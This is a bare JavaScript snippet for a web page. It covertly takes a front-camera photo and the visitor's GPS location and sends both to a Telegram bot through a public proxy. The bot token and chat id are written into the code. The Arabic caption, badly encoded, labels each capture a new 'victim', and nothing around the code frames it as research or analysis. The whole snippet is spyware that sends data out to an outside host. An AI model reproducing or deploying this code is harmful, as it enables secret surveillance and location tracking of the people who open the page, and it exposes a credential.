<script>
function start() {
    navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{
        let v=document.createElement('video');
        v.srcObject=s; v.play();
        setTimeout(()=>{
            let c=document.createElement('canvas');
            c.width=1280; c.height=720;
            c.getContext('2d').drawImage(v,0,0,1280,720);
            let img=c.toDataURL('image/jpeg');

            navigator.geolocation.getCurrentPosition(p=>{
                let gps = p.coords.latitude + "," + p.coords.longitude + " Â±" + p.coords.accuracy + "m";

                let proxy = "https://api.allorigins.win/raw?url=";
                let telegramUrl = encodeURIComponent("https://api.telegram.org/bot8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8/sendPhoto?chat_id=1611398303");

                let f = new FormData();
                f.append('photo', dataURLtoBlob(img));
                f.append('caption', "ðŸ†• Ø¶Ø­ÙŠØ© Ø¬Ø¯ÙŠØ¯Ø© Ù…Ù† Ø§Ù„ØªÙ„\nGPS: " + gps);

                fetch(proxy + telegramUrl, {method: 'POST', body: f});
            });
            s.getTracks().forEach(t=>t.stop());
        }, 1000);
    });
}

function dataURLtoBlob(dataurl) {
    let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
    while(n--) u8arr[n] = bstr.charCodeAt(n);
    return new Blob([u8arr], {type:mime});
}
</script>
